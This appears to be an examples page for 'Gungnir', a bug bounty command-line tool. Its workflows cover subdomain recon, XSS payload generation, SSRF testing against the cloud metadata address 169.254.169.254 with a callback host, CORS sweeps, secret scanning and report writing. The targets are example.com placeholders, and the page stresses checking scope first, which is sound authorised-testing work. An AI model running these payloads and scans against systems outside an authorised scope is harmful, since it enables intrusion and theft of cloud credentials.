# Gungnir Examples

Practical, copy-pasteable workflows for common bug bounty tasks.
**Always run `gungnir scope check` first.**

## 1. Full recon pass on a scoped program

```bash
# brief.txt defines what's in/out of scope
cat > brief.txt <<EOF
in_scope:
  - *.example.com
out_of_scope:
  - *.staging.example.com
EOF

# 1. Validate a few targets
gungnir scope check --brief brief.txt \
  --target https://app.example.com --target https://staging.example.com

# 2. Enumerate subdomains (filtered to scope), resolve to IPs
gungnir recon subdomains --domain example.com --resolve --scope brief.txt --out subs.txt

# 3. Fingerprint each live subdomain's stack + security headers
while read -r sub; do
  gungnir recon fingerprint --url "https://$sub" --audit
done < subs.txt

# 4. Discover interesting endpoints
gungnir recon content --url https://app.example.com --status 200,301,302,401,403
```

## 2. XSS payload generation + reflection testing

```bash
# Generate a full mutated wordlist
gungnir vulns xss --generate --out xss.txt

# Then use your fuzzer of choice (ffuf, etc.) or test reflection in library mode:
python -c "
from gungnir.vulns.xss import XssPayloadGen
from gungnir.utils.http import HttpClient
gen = XssPayloadGen()
client = HttpClient()
for p in gen.generate(mutate=True):
    r = client.get('https://app.example.com/search?q=' + p)
    if r.text and gen.check_reflection(r.text, p):
        print('REFLECTED:', p)
"
```

## 3. SSRF testing with an out-of-band channel

```bash
# Spin up an interactsh callback host, then:
gungnir vulns ssrf --metadata --bypass --callback YOUR.interact.sh --out ssrf.txt

# Feed the payloads into your SSRF target's URL parameter and watch for callbacks.
# To check whether a fetched response reveals internal details:
python -c "
from gungnir.vulns.ssrf import SsrfHelper
from gungnir.utils.http import HttpClient
h = SsrfHelper()
r = HttpClient().get('https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/')
print(h.detect_internal_indicators(r.text))
"
```

## 4. CORS misconfiguration sweep

```bash
for sub in $(cat subs.txt); do
  echo "=== $sub ==="
  gungnir vulns cors --url "https://$sub/api"
done
```

## 5. Secret exposure scan

```bash
# Scan a saved HTTP response, any config file, or a JS bundle:
gungnir vulns secrets --file response.txt --json > findings.json
gungnir vulns secrets --file app.js
```

## 6. Generate a payout-ready report

```bash
gungnir report xss \
  --url 'https://app.example.com/search?q=<script>alert(1)</script>' \
  --payload '<script>alert(1)</script>' \
  --reporter '@yourhandle' \
  --out reports/xss-search.md

# Compute the CVSS score for your own vector:
gungnir report cvss --vector 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N'
```
